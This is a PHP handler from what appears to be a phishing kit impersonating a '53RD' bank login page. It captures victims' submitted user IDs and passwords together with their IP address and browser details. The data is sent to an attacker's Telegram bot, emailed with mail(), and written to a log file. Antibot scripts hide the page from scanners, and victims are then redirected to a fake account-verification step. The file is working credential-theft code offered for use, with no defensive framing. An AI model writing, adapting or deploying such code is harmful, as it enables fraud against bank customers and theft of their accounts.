<?php

session_start();
error_reporting(0);


$TIME_DATE = date('H:i:s d/m/Y');
include ('../config.php');
include('../assets/functions/get_browser.php');
include('../assets/functions/get_ip.php');
include('../assets/Antibot/blockers.php');
include('../assets/Antibot/detects.php');



$Z118_MESSAGE .= "

[ 53RD LOGIN INFORMATION ]
[ LOGIN INFORMATION ]
[User ID] = ".$_POST['user-id']."
[User Password] = ".$_POST['password']."

[VICTIM INFORMATION]

[TIME/DATE]    = ".$TIME_DATE."
[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."

[BY @X_hammer]\n";

if (isset($_POST['user-id']) && !empty($_POST['password'])){
	
	$data = [
		'text' => ''.$Z118_MESSAGE.'',
		'chat_id' => ''.$chat_id.''
	];
	file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
	
	
	
        $Z118_SUBJECT = "NEW XD ✪ LOGIN INFO FROM : ✪ ".$_POST['user-id']." ✪";
        $Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
        $Z118_HEADERS .= $_POST['user-id']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		
		if ($save_result == "on") {
			$res_file = fopen("../53RD_LOGS/UserLogin.txt", "a");
			fwrite($res_file, $Z118_MESSAGE);
		}
		
       
        @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
				
		HEADER("Location: ../unusual/?actionType=VerfiyInfo&ConfirmAccount=True&session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
}
	  else
	  {
		  HEADER("Location: ../login/?confirm_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
	  }
	  		
?>